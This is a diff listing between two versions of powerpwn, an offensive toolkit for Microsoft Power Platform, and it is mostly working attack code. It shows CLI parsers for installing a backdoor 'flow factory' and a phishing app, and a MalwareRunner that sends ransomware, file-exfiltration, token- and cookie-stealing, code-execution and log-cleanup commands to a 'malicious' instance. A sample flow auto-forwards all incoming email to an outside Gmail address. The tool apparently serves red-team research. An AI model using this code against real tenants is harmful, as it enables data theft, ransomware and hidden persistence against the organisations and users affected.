+    delete_flow_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
+    delete_flow_parser.add_argument("-f", "--flow-id", type=str, help="Flow id to delete.")
+
+    ## Create Flow parser ##
+    create_flow_parser = backdoor_subparsers.add_parser(
+        BackdoorActionType.create_flow.value, description="Creates a flow.", help="Creates a flow using installed backdoor flow."
+    )
+    create_flow_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
+    create_flow_parser.add_argument("-i", "--input", type=str, required=True, help="Path to flow details input file.")
+
+    ## Get connections parser ##
+    get_connections_parser = backdoor_subparsers.add_parser(
+        BackdoorActionType.get_connections.value, description="Get connections", help="Gets connections details in environment"
+    )
+    get_connections_parser.add_argument(
+        "-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform"
+    )
+    get_connections_parser.add_argument("-o", "--output", type=str, default="", help="Path to output file.")
+
+    ## backdoor installer parser ##
+    installer = backdoor_subparsers.add_parser(
+        BackdoorActionType.install_factory.value, description="Install flow factory", help="Installs flow factory in powerplatform"
+    )
+    installer.add_argument("-c", "--connection-id", required=True, type=str, help="The connection id of management connection")
+    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
+
+
+def module_phishing(command_subparsers: argparse.ArgumentParser):
+    phishing = command_subparsers.add_parser("phishing", description="Deploy a trustworthy phishing app", help="Deploy a trustworthy phishing app.")
+    phishing_subparsers = phishing.add_subparsers(help="phishing_subcommand", dest="phishing_subcommand")
+
+    installer = phishing_subparsers.add_parser(
+        "install-app", description="Installs phishing app.", help="Installs a phishing app in the target environment."
+    )
+    installer.add_argument("-i", "--input", type=str, required=True, help="Path to app package zip file.")
+    installer.add_argument("-t", "--tenant", required=False, type=str, help="Tenant id to connect.")
+    installer.add_argument("-n", "--app-name", required=True, type=str, help="Display name of the app.")
+    installer.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id to install the app in.")
+
+    app_share = phishing_subparsers.add_parser("share-app", description="Share app with organization", help="Share app with organization")
+    app_share.add_argument("-a", "--app-id", required=True, type=str, help="App id to share")
+    app_share.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id that the app belongs to.")
+    app_share.add_argument("-t", "--tenant", required=True, type=str, help="Tenant id to connect.")
+
+
+def parse_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
+    command_subparsers = parser.add_subparsers(help="command", dest="command")
+
+    module_dump(command_subparsers)
+    module_recon(command_subparsers)
+    module_gui(command_subparsers)
+    module_backdoor(command_subparsers)
+    module_nocodemalware(command_subparsers)
+    module_phishing(command_subparsers)
+
+    args = parser.parse_args()
+
+    return args
```

### Comparing `powerpwn-2.1.4/src/powerpwn/main.py` & `powerpwn-2.1.5/src/powerpwn/main.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,47 +1,54 @@
-import logging
-
-from art import tprint
-
-from powerpwn.cli.arguments import parse_arguments
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.cli.runners import (
-    run_backdoor_flow_command,
-    run_dump_command,
-    run_gui_command,
-    run_nocodemalware_command,
-    run_phishing_command,
-    run_recon_command,
-)
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-def main():
-    print("\n\n------------------------------------------------------------")
-    tprint("powerpwn")
-    print("------------------------------------------------------------\n\n")
-
-    args = parse_arguments()
-
-    logging.basicConfig(level=args.log_level, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
-    logger.level = args.log_level
-    command = args.command
-
-    if command == "dump":
-        run_dump_command(args)
-    elif command == "recon":
-        run_recon_command(args)
-    elif command == "gui":
-        run_gui_command(args)
-    elif command == "backdoor":
-        run_backdoor_flow_command(args)
-    elif command == "nocodemalware":
-        run_nocodemalware_command(args)
-    elif command == "phishing":
-        run_phishing_command(args)
-    else:
-        logger.info("Run `powerpwn --help` for available commands.")
-
-
-if __name__ == "__main__":
-    main()
+import logging
+
+from art import tprint
+
+from powerpwn.cli.arguments import parse_arguments
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.cli.runners import (
+    run_backdoor_flow_command,
+    run_dump_command,
+    run_gui_command,
+    run_nocodemalware_command,
+    run_phishing_command,
+    run_recon_command,
+)
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+def main():
+    print("\n\n------------------------------------------------------------")
+    tprint("powerpwn")
+    print("t2`24 edition\n\n")
+    print("------------------------------------------------------------\n\n")
+
+    args = parse_arguments()
+
+    logging.basicConfig(level=args.log_level, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+    logger.level = args.log_level
+    command = args.command
+
+    if command == "dump":
+        run_dump_command(args)
+        if args.gui:
+            logger.info("Going to run local server for gui")
+            run_gui_command(args)
+    elif command == "recon":
+        run_recon_command(args)
+        if args.gui:
+            logger.info("Going to run local server for gui")
+            run_gui_command(args)
+    elif command == "gui":
+        run_gui_command(args)
+    elif command == "backdoor":
+        run_backdoor_flow_command(args)
+    elif command == "nocodemalware":
+        run_nocodemalware_command(args)
+    elif command == "phishing":
+        run_phishing_command(args)
+    else:
+        logger.info("Run `powerpwn --help` for available commands.")
+
+
+if __name__ == "__main__":
+    main()
```

### Comparing `powerpwn-2.1.4/src/powerpwn/nocodemalware/malware_runner.py` & `powerpwn-2.1.5/src/powerpwn/nocodemalware/malware_runner.py`

 * *Ordering differences only*

 * *Files 8% similar despite different names*

```diff
@@ -1,119 +1,119 @@
-import json
-from typing import List
-
-import requests
-from pydantic.error_wrappers import ValidationError
-
-from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
-from powerpwn.nocodemalware.models.any_command_args import AnyCommandArgs
-from powerpwn.nocodemalware.models.cleanup_command_args import CleanupCommandArgs
-from powerpwn.nocodemalware.models.cmd_results import CommandResults
-from powerpwn.nocodemalware.models.code_exec_args_properties import CodeExecArgsProperties
-from powerpwn.nocodemalware.models.code_exec_command_args import CodeExecCommandArgs
-from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
-from powerpwn.nocodemalware.models.exflirtate_file_args_properties import ExflirtateFileArgsProperties
-from powerpwn.nocodemalware.models.exflirtate_file_command_args import ExflirtateFileCommandArgs
-from powerpwn.nocodemalware.models.ransomware_args_properties import RansomwareArgsProperties
-from powerpwn.nocodemalware.models.ransomware_command_args import RansomwareCommandArgs
-from powerpwn.nocodemalware.models.steal_cookie_args_properties import StealCookieArgsProperties
-from powerpwn.nocodemalware.models.steal_cookie_command_args import StealCookieCommandArgs
-from powerpwn.nocodemalware.models.steal_power_automate_token_command_args import StealPowerAutomateTokenCommandArgs
-
-
-class MalwareRunner:
-    def __init__(self, post_url: str, debug: bool = False):
-        """
-        Power Pwn client to run commands through Microsoft infrastructure
-        :param post_url: a URL on the malicious Microsoft instance to post commands to
-        :param debug: whether to print debug messages
-        """
-        self.post_url = post_url
-        self.debug = debug
-
-    def run_cmd(self, arguments: AnyCommandArgs) -> CommandResults:
-        if self.debug:
-            print(f"Raw command: {arguments.__root__}")
-
-        try:
-            cmd_args = json.loads(arguments.__root__.json())
-        except json.JSONDecodeError:
-            print(f"Bad command. Raw content: {arguments}")
-            raise
-
-        results = self._run_cmd(arguments_as_dict=cmd_args)
-
-        if "error" in results:
-            cmd_res = CommandResults(is_success=False, error_message=results["error"]["message"])
-        else:
-            cmd_res = CommandResults.parse_obj(results)
-        return cmd_res
-
-    def _run_cmd(self, arguments_as_dict: dict) -> dict:  # type: ignore
-        # noinspection PyTypeChecker
-        resp = requests.post(url=self.post_url, json=arguments_as_dict)  # nosec
-
-        if self.debug:
-            print(f"Raw content: {resp.content.decode('utf8')}")
-
-        try:
-            return resp.json()
-        except ValidationError:
-            print(f"Bad response. Raw content: {resp.content.decode('utf8')}")
-            raise
-
-    def exec_command(self, command: str, command_type: CodeExecTypeEnum) -> CommandResults:
-        props = CodeExecArgsProperties(code_exec_command_type=command_type, code_exec_command=command)
-        flow_args = AnyCommandArgs.parse_obj(CodeExecCommandArgs(command_properties=props))  # type: ignore[arg-type]
-        return self.run_cmd(flow_args)
-
-    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
-        """
-        Overwrite all files in dirs_to_init_crawl with an encrypted version
-        :param crawl_depth: recursively search into subdirectories this many times
-        :param dirs_to_init_crawl: a list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')
-        :param encryption_key: an encryption key used to encrypt each file identified (AES256)
-        :return: command results
-        """
-        dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
-        props = RansomwareArgsProperties(
-            ransomware_crawl_depth=crawl_depth, ransomware_directories_to_init_crawl=dirs_to_init_crawl_str, ransomware_encryption_key=encryption_key
-        )
-        flow_args = AnyCommandArgs.parse_obj(RansomwareCommandArgs(command_properties=props))  # type: ignore[arg-type] # known bug: https://github.com/python/mypy/issues/13421
-        return self.run_cmd(flow_args)
-
-    def exfiltrate(self, target_file_path: str) -> CommandResults:
-        """
-        Exfiltrate file from victim machine
-        :param target_file_path: absolute path to file
-        :return: command results
-        """
-        props = ExflirtateFileArgsProperties(exfiltrate_target_file=target_file_path)
-        flow_args = AnyCommandArgs.parse_obj(ExflirtateFileCommandArgs(command_properties=props))  # type: ignore[arg-type]
-        return self.run_cmd(flow_args)
-
-    def cleanup(self) -> CommandResults:
-        """
-        Delete agent log files
-        :return: command results
-        """
-
-        flow_args = AnyCommandArgs.parse_obj(CleanupCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
-        return self.run_cmd(flow_args)
-
-    def steal_power_automate_token(self) -> CommandResults:
-        """
-        Open a browser, go to the Power Automate website and steal the authentication token
-        :return: command results
-        """
-        flow_args = AnyCommandArgs.parse_obj(StealPowerAutomateTokenCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
-        return self.run_cmd(flow_args)
-
-    def steal_cookie(self, fqdn: str) -> CommandResults:
-        """
-        Open a browser, go to the FQDN and seal its cookies
-        :param fqdn: fully qualified domain name to fetch the cookies of
-        :return: command results
-        """
-        props = StealCookieArgsProperties(steal_cookie_fqdn=fqdn)
-        flow_args = AnyCommandArgs.parse_obj(StealCookieCommandArgs(command_properties=props))  # type: ignore[arg-type]
-        return self.run_cmd(flow_args)
+import json
+from typing import List
+
+import requests
+from pydantic.error_wrappers import ValidationError
+
+from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
+from powerpwn.nocodemalware.models.any_command_args import AnyCommandArgs
+from powerpwn.nocodemalware.models.cleanup_command_args import CleanupCommandArgs
+from powerpwn.nocodemalware.models.cmd_results import CommandResults
+from powerpwn.nocodemalware.models.code_exec_args_properties import CodeExecArgsProperties
+from powerpwn.nocodemalware.models.code_exec_command_args import CodeExecCommandArgs
+from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
+from powerpwn.nocodemalware.models.exflirtate_file_args_properties import ExflirtateFileArgsProperties
+from powerpwn.nocodemalware.models.exflirtate_file_command_args import ExflirtateFileCommandArgs
+from powerpwn.nocodemalware.models.ransomware_args_properties import RansomwareArgsProperties
+from powerpwn.nocodemalware.models.ransomware_command_args import RansomwareCommandArgs
+from powerpwn.nocodemalware.models.steal_cookie_args_properties import StealCookieArgsProperties
+from powerpwn.nocodemalware.models.steal_cookie_command_args import StealCookieCommandArgs
+from powerpwn.nocodemalware.models.steal_power_automate_token_command_args import StealPowerAutomateTokenCommandArgs
+
+
+class MalwareRunner:
+    def __init__(self, post_url: str, debug: bool = False):
+        """
+        Power Pwn client to run commands through Microsoft infrastructure
+        :param post_url: a URL on the malicious Microsoft instance to post commands to
+        :param debug: whether to print debug messages
+        """
+        self.post_url = post_url
+        self.debug = debug
+
+    def run_cmd(self, arguments: AnyCommandArgs) -> CommandResults:
+        if self.debug:
+            print(f"Raw command: {arguments.__root__}")
+
+        try:
+            cmd_args = json.loads(arguments.__root__.json())
+        except json.JSONDecodeError:
+            print(f"Bad command. Raw content: {arguments}")
+            raise
+
+        results = self._run_cmd(arguments_as_dict=cmd_args)
+
+        if "error" in results:
+            cmd_res = CommandResults(is_success=False, error_message=results["error"]["message"])
+        else:
+            cmd_res = CommandResults.parse_obj(results)
+        return cmd_res
+
+    def _run_cmd(self, arguments_as_dict: dict) -> dict:  # type: ignore
+        # noinspection PyTypeChecker
+        resp = requests.post(url=self.post_url, json=arguments_as_dict)  # nosec
+
+        if self.debug:
+            print(f"Raw content: {resp.content.decode('utf8')}")
+
+        try:
+            return resp.json()
+        except ValidationError:
+            print(f"Bad response. Raw content: {resp.content.decode('utf8')}")
+            raise
+
+    def exec_command(self, command: str, command_type: CodeExecTypeEnum) -> CommandResults:
+        props = CodeExecArgsProperties(code_exec_command_type=command_type, code_exec_command=command)
+        flow_args = AnyCommandArgs.parse_obj(CodeExecCommandArgs(command_properties=props))  # type: ignore[arg-type]
+        return self.run_cmd(flow_args)
+
+    def ransomware(self, crawl_depth: str, dirs_to_init_crawl: List[str], encryption_key: str) -> CommandResults:
+        """
+        Overwrite all files in dirs_to_init_crawl with an encrypted version
+        :param crawl_depth: recursively search into subdirectories this many times
+        :param dirs_to_init_crawl: a list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')
+        :param encryption_key: an encryption key used to encrypt each file identified (AES256)
+        :return: command results
+        """
+        dirs_to_init_crawl_str = ",".join(dirs_to_init_crawl)
+        props = RansomwareArgsProperties(
+            ransomware_crawl_depth=crawl_depth, ransomware_directories_to_init_crawl=dirs_to_init_crawl_str, ransomware_encryption_key=encryption_key
+        )
+        flow_args = AnyCommandArgs.parse_obj(RansomwareCommandArgs(command_properties=props))  # type: ignore[arg-type] # known bug: https://github.com/python/mypy/issues/13421
+        return self.run_cmd(flow_args)
+
+    def exfiltrate(self, target_file_path: str) -> CommandResults:
+        """
+        Exfiltrate file from victim machine
+        :param target_file_path: absolute path to file
+        :return: command results
+        """
+        props = ExflirtateFileArgsProperties(exfiltrate_target_file=target_file_path)
+        flow_args = AnyCommandArgs.parse_obj(ExflirtateFileCommandArgs(command_properties=props))  # type: ignore[arg-type]
+        return self.run_cmd(flow_args)
+
+    def cleanup(self) -> CommandResults:
+        """
+        Delete agent log files
+        :return: command results
+        """
+
+        flow_args = AnyCommandArgs.parse_obj(CleanupCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
+        return self.run_cmd(flow_args)
+
+    def steal_power_automate_token(self) -> CommandResults:
+        """
+        Open a browser, go to the Power Automate website and steal the authentication token
+        :return: command results
+        """
+        flow_args = AnyCommandArgs.parse_obj(StealPowerAutomateTokenCommandArgs(command_properties=CommandArgsPropertiesBaseModel()))  # type: ignore[arg-type]
+        return self.run_cmd(flow_args)
+
+    def steal_cookie(self, fqdn: str) -> CommandResults:
+        """
+        Open a browser, go to the FQDN and seal its cookies
+        :param fqdn: fully qualified domain name to fetch the cookies of
+        :return: command results
+        """
+        props = StealCookieArgsProperties(steal_cookie_fqdn=fqdn)
+        flow_args = AnyCommandArgs.parse_obj(StealCookieCommandArgs(command_properties=props))  # type: ignore[arg-type]
+        return self.run_cmd(flow_args)
```

### Comparing `powerpwn-2.1.4/src/powerpwn/nocodemalware/models/cmd_arguments.py` & `powerpwn-2.1.5/src/powerpwn/nocodemalware/models/cmd_arguments.py`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,13 +1,13 @@
-from typing import Generic, TypeVar
-
-from pydantic.generics import GenericModel
-
-from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
-from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
-
-_TCommandArgumentProperties = TypeVar("_TCommandArgumentProperties", bound=CommandArgsPropertiesBaseModel)
-
-
-class CommandArguments(GenericModel, Generic[_TCommandArgumentProperties]):
-    command_to_run: CommandToRunEnum
-    command_properties: _TCommandArgumentProperties
+from typing import Generic, TypeVar
+
+from pydantic.generics import GenericModel
+
+from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
+from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
+
+_TCommandArgumentProperties = TypeVar("_TCommandArgumentProperties", bound=CommandArgsPropertiesBaseModel)
+
+
+class CommandArguments(GenericModel, Generic[_TCommandArgumentProperties]):
+    command_to_run: CommandToRunEnum
+    command_properties: _TCommandArgumentProperties
```

### Comparing `powerpwn-2.1.4/src/powerpwn/nocodemalware/models/ransomware_args_properties.py` & `powerpwn-2.1.5/src/powerpwn/nocodemalware/models/ransomware_args_properties.py`

 * *Ordering differences only*

 * *Files 22% similar despite different names*

```diff
@@ -1,9 +1,9 @@
-from pydantic import Field
-
-from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
-
-
-class RansomwareArgsProperties(CommandArgsPropertiesBaseModel):
-    ransomware_crawl_depth: str = Field(help="Recursively search into subdirectories this many times")
-    ransomware_directories_to_init_crawl: str = Field(help="A list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')")
-    ransomware_encryption_key: str = Field(help="an encryption key used to encrypt each file identified (AES256)")
+from pydantic import Field
+
+from powerpwn.nocodemalware.models.command_args_properties_base_model import CommandArgsPropertiesBaseModel
+
+
+class RansomwareArgsProperties(CommandArgsPropertiesBaseModel):
+    ransomware_crawl_depth: str = Field(help="Recursively search into subdirectories this many times")
+    ransomware_directories_to_init_crawl: str = Field(help="A list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')")
+    ransomware_encryption_key: str = Field(help="an encryption key used to encrypt each file identified (AES256)")
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdoor/backdoor_flow.py` & `powerpwn-2.1.5/src/powerpwn/powerdoor/backdoor_flow.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,92 +1,92 @@
-import json
-import logging
-import os
-from typing import Any, Dict, List
-
-import requests
-from pydantic import ValidationError
-
-from powerpwn.cli.const import LOGGER_NAME, TOOL_NAME
-from powerpwn.powerdoor.create_flow_model import CreateFlowModel
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-class BackdoorFlow:
-    def __init__(self, webhook: str):
-        self.webhook = webhook
-        self.session = requests.Session()
-        self.session.headers = {"User-Agent": TOOL_NAME}
-
-    def __command(self, action: str, inputs: Dict[str, Any], output_to_stdout: bool = True):
-        resp = self.session.post(url=self.webhook, json={"action": action, "inputs": inputs})
-        if resp.status_code == 400:
-            logger.error(f"Bad request schema. Error: {resp.content}.")
-        elif resp.status_code == 500 and "action" in resp.headers:
-            logger.error(f"Failed to perform action {resp.headers['action']}. Error: {resp.content}.")
-        elif resp.status_code == 200:
-            logger.info(f"Action {action} completed successfully.")
-            if output_to_stdout:
-                logger.info(f"Response: {resp.content}.")
-            pass
-        else:
-            logger.error(f"Unexpected status code {resp.status_code}. Error: {resp.content}.")
-
-        json_content = resp.json()
-        return json_content
-
-    def get_connections(self, environment_id: str, output_to_stdout: bool = True):
-        # returns: connectionName=['name'], id=['properties']['apiId']
-        return self.__command(action="getConnections", inputs={"environment": environment_id}, output_to_stdout=output_to_stdout)
-
-    def create_flow(
-        self,
-        environment_id: str,
-        flow_display_name: str,
-        flow_definition: Any,
-        flow_state: str,
-        connection_references: List[Dict[str, str]],
-        is_webhook: bool,
-    ):
-        # returns: flowId=['flowId']
-        return self.__command(
-            action="createFlow",
-            inputs={
-                "environment": environment_id,
-                "flowDisplayName": flow_display_name,
-                "flowDefinition": flow_definition,
-                "flowState": flow_state,
-                "connectionReferences": connection_references,
-                "isWebhook": is_webhook,
-            },
-            output_to_stdout=True,
-        )
-
-    def create_flow_from_input_file(self, environment_id: str, input_file_path: str):
-        if not os.path.exists(input_file_path):
-            logger.info("Input file is not found")
-            return None
-
-        with open(input_file_path) as f:
-            try:
-                input_file_content = json.load(f)
-                input_file_model = CreateFlowModel.parse_obj(input_file_content)
-                is_webhook = input_file_model.flow_definition["triggers"].get("manual", {}).get("kind", "") == "Http"
-                return self.create_flow(
-                    environment_id,
-                    input_file_model.flow_display_name,
-                    input_file_model.flow_definition,
-                    input_file_model.flow_state,
-                    input_file_model.connection_references,
-                    is_webhook=is_webhook,
-                )
-            except json.decoder.JSONDecodeError:
-                logger.info("Input file is not a valid json.")
-                return None
-            except ValidationError:
-                logger.info("Input file is not in expected format. ")
-                return None
-
-    def delete_flow(self, environment_id: str, flow_id: str):
-        # returns:
-        return self.__command(action="deleteFlow", inputs={"environment": environment_id, "flowId": flow_id})
+import json
+import logging
+import os
+from typing import Any, Dict, List
+
+import requests
+from pydantic import ValidationError
+
+from powerpwn.cli.const import LOGGER_NAME, TOOL_NAME
+from powerpwn.powerdoor.create_flow_model import CreateFlowModel
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+class BackdoorFlow:
+    def __init__(self, webhook: str):
+        self.webhook = webhook
+        self.session = requests.Session()
+        self.session.headers = {"User-Agent": TOOL_NAME}
+
+    def __command(self, action: str, inputs: Dict[str, Any], output_to_stdout: bool = True):
+        resp = self.session.post(url=self.webhook, json={"action": action, "inputs": inputs})
+        if resp.status_code == 400:
+            logger.error(f"Bad request schema. Error: {resp.content}.")
+        elif resp.status_code == 500 and "action" in resp.headers:
+            logger.error(f"Failed to perform action {resp.headers['action']}. Error: {resp.content}.")
+        elif resp.status_code == 200:
+            logger.info(f"Action {action} completed successfully.")
+            if output_to_stdout:
+                logger.info(f"Response: {resp.content}.")
+            pass
+        else:
+            logger.error(f"Unexpected status code {resp.status_code}. Error: {resp.content}.")
+
+        json_content = resp.json()
+        return json_content
+
+    def get_connections(self, environment_id: str, output_to_stdout: bool = True):
+        # returns: connectionName=['name'], id=['properties']['apiId']
+        return self.__command(action="getConnections", inputs={"environment": environment_id}, output_to_stdout=output_to_stdout)
+
+    def create_flow(
+        self,
+        environment_id: str,
+        flow_display_name: str,
+        flow_definition: Any,
+        flow_state: str,
+        connection_references: List[Dict[str, str]],
+        is_webhook: bool,
+    ):
+        # returns: flowId=['flowId']
+        return self.__command(
+            action="createFlow",
+            inputs={
+                "environment": environment_id,
+                "flowDisplayName": flow_display_name,
+                "flowDefinition": flow_definition,
+                "flowState": flow_state,
+                "connectionReferences": connection_references,
+                "isWebhook": is_webhook,
+            },
+            output_to_stdout=True,
+        )
+
+    def create_flow_from_input_file(self, environment_id: str, input_file_path: str):
+        if not os.path.exists(input_file_path):
+            logger.info("Input file is not found")
+            return None
+
+        with open(input_file_path) as f:
+            try:
+                input_file_content = json.load(f)
+                input_file_model = CreateFlowModel.parse_obj(input_file_content)
+                is_webhook = input_file_model.flow_definition["triggers"].get("manual", {}).get("kind", "") == "Http"
+                return self.create_flow(
+                    environment_id,
+                    input_file_model.flow_display_name,
+                    input_file_model.flow_definition,
+                    input_file_model.flow_state,
+                    input_file_model.connection_references,
+                    is_webhook=is_webhook,
+                )
+            except json.decoder.JSONDecodeError:
+                logger.info("Input file is not a valid json.")
+                return None
+            except ValidationError:
+                logger.info("Input file is not in expected format. ")
+                return None
+
+    def delete_flow(self, environment_id: str, flow_id: str):
+        # returns:
+        return self.__command(action="deleteFlow", inputs={"environment": environment_id, "flowId": flow_id})
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py` & `powerpwn-2.1.5/src/powerpwn/powerdoor/samples/forward email_backdoor_flow.py`

 * *Ordering differences only*

 * *Files 17% similar despite different names*

```diff
@@ -1,55 +1,55 @@
-## A Sample flow to create in powerplatform ##
-
-SAMPLE_FLOW = {
-    "environment": "Default-32f814a9-68c8-4ca1-93aa-5594523476b3",
-    "connectionName": "shared-gmail-444b9c37-a162-47e0-bbaf-7c2a-3fa7cbbd",
-    "connectionApiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
-    "flowDisplayName": "PWN",
-    "flowDefinition": {
-        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
-        "contentVersion": "1.0.0.0",
-        "parameters": {"$connections": {"defaultValue": {}, "type": "Object"}, "$authentication": {"defaultValue": {}, "type": "SecureObject"}},
-        "triggers": {
-            "When_a_new_email_arrives": {
-                "recurrence": {"frequency": "Minute", "interval": 1},
-                "metadata": {"operationMetadataId": "f8fda515-f436-4f4d-811d-33a37c6ea879"},
-                "type": "OpenApiConnection",
-                "inputs": {
-                    "host": {
-                        "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
-                        "connectionName": "shared_gmail",
-                        "operationId": "OnNewEmail",
-                    },
-                    "parameters": {
-                        "label": "INBOX",
-                        "importance": "All",
-                        "starred": "All",
-                        "fetchOnlyWithAttachments": False,
-                        "includeAttachments": False,
-                    },
-                    "authentication": "@parameters('$authentication')",
-                },
-            }
-        },
-        "actions": {
-            "Send_email_(V2)_2": {
-                "runAfter": {},
-                "metadata": {"operationMetadataId": "16392aa1-6da8-42ca-a366-18d69194da73"},
-                "type": "OpenApiConnection",
-                "inputs": {
-                    "host": {
-                        "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
-                        "connectionName": "shared_gmail",
-                        "operationId": "SendEmailV2",
-                    },
-                    "parameters": {"emailMessage/To": "imkrissmith@gmail.com"},
-                    "authentication": "@parameters('$authentication')",
-                },
-            }
-        },
-    },
-    "flowState": "Stopped",
-    "connectionReferences": [
-        {"connectionName": "shared-gmail-444b9c37-a162-47e0-bbaf-7c2a-3fa7cbbd", "id": "/providers/Microsoft.PowerApps/apis/shared_gmail"}
-    ],
-}
+## A Sample flow to create in powerplatform ##
+
+SAMPLE_FLOW = {
+    "environment": "Default-32f814a9-68c8-4ca1-93aa-5594523476b3",
+    "connectionName": "shared-gmail-444b9c37-a162-47e0-bbaf-7c2a-3fa7cbbd",
+    "connectionApiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
+    "flowDisplayName": "PWN",
+    "flowDefinition": {
+        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+        "contentVersion": "1.0.0.0",
+        "parameters": {"$connections": {"defaultValue": {}, "type": "Object"}, "$authentication": {"defaultValue": {}, "type": "SecureObject"}},
+        "triggers": {
+            "When_a_new_email_arrives": {
+                "recurrence": {"frequency": "Minute", "interval": 1},
+                "metadata": {"operationMetadataId": "f8fda515-f436-4f4d-811d-33a37c6ea879"},
+                "type": "OpenApiConnection",
+                "inputs": {
+                    "host": {
+                        "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
+                        "connectionName": "shared_gmail",
+                        "operationId": "OnNewEmail",
+                    },
+                    "parameters": {
+                        "label": "INBOX",
+                        "importance": "All",
+                        "starred": "All",
+                        "fetchOnlyWithAttachments": False,
+                        "includeAttachments": False,
+                    },
+                    "authentication": "@parameters('$authentication')",
+                },
+            }
+        },
+        "actions": {
+            "Send_email_(V2)_2": {
+                "runAfter": {},
+                "metadata": {"operationMetadataId": "16392aa1-6da8-42ca-a366-18d69194da73"},
+                "type": "OpenApiConnection",
+                "inputs": {
+                    "host": {
+                        "apiId": "/providers/Microsoft.PowerApps/apis/shared_gmail",
+                        "connectionName": "shared_gmail",
+                        "operationId": "SendEmailV2",
+                    },
+                    "parameters": {"emailMessage/To": "imkrissmith@gmail.com"},
+                    "authentication": "@parameters('$authentication')",
+                },
+            }
+        },
+    },
+    "flowState": "Stopped",
+    "connectionReferences": [
+        {"connectionName": "shared-gmail-444b9c37-a162-47e0-bbaf-7c2a-3fa7cbbd", "id": "/providers/Microsoft.PowerApps/apis/shared_gmail"}
+    ],
+}
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/collect/data_collectors/connections_data_collectors/connections_data_collector.py`

 * *Ordering differences only*

 * *Files 7% similar despite different names*

```diff
@@ -1,63 +1,63 @@
-import base64
-import io
-import os
-from typing import List
-
-import PIL.Image as Image
-import requests
-
-from powerpwn.powerdump.collect.data_collectors.connections_data_collectors.connectors import API_NAME_TO_CONNECTOR_CLS
-from powerpwn.powerdump.collect.data_collectors.enums.data_dump_source import DataDumpSource
-from powerpwn.powerdump.collect.data_collectors.idata_collector import IDataCollector
-from powerpwn.powerdump.collect.models.data_dump_entity import DataDumpWithContext
-from powerpwn.powerdump.collect.models.data_store_entity import DataStoreWithContext
-from powerpwn.powerdump.utils.model_loaders import get_connector, load_connections
-
-
-class ConnectionsDataCollector(IDataCollector):
-    def __init__(self, cache_path: str) -> None:
-        self.__cache_path = cache_path
-
-    def collect(self, session: requests.Session, env_id: str, output_dir_path: str) -> None:
-        data_dumps: List[DataDumpWithContext] = []
-        connections_dumps_root_dir = os.path.join(output_dir_path, DataDumpSource.connections.value)
-
-        for connection in load_connections(cache_path=self.__cache_path, env_id=env_id):
-            current_data_stores: List[DataStoreWithContext] = []
-            connection_id = connection.connection_id
-            api_name = connection.api_name
-
-            connections_apis_dir = os.path.join(connections_dumps_root_dir, connection.api_name)
-            if not connection.shareable:
-                continue
-            if api_name in API_NAME_TO_CONNECTOR_CLS:
-                connection_dump_root_dir = os.path.join(connections_apis_dir, connection.connection_id)
-
-                connector_cls = API_NAME_TO_CONNECTOR_CLS[api_name]
-                spec = get_connector(self.__cache_path, connection.environment_id, connector_cls.api_name())
-
-                connector_cls_instance = connector_cls(session=session, spec=spec, connection_id=connection_id)
-                current_data_stores = connector_cls_instance.ping(connection_parameters=connection.connection_parameters)
-
-                for data_store in current_data_stores:
